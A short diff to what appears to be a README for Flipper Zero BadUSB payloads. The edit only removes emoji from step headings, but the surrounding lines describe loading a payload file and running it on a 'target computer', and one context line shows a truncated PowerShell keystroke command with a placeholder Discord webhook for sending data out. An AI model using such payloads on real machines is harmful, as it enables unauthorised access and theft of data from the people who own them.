@@ -56,7 +56,7 @@
 
 **Tip**: Start with Rick Roll to test everything works!
 
-### Step 3️⃣: Configure (If Needed)
+### Step 3: Configure (If Needed)
 
 Open your `.txt` file in **any text editor** (Notepad works fine)
 
@@ -72,7 +72,7 @@ STRING powershell ... '$env:DC='https://discord.com/api/webhooks/1234567890/AbCd
 
 **That's it!** Save the file.
 
-### Step 4️⃣: Copy to Flipper
+### Step 4: Copy to Flipper
 
 Connect Flipper to your computer via USB:
 
@@ -81,7 +81,7 @@ Connect Flipper to your computer via USB:
    (Create `badusb` folder if it doesn't exist)
 3. **Drag and drop** your `.txt` file into `badusb/`
 
-### Step 5️⃣: Run on Target
+### Step 5: Run on Target
 
 1. On Flipper: `Apps` → `Bad USB` → Select your payload
 2. Plug Flipper into target computer's USB port
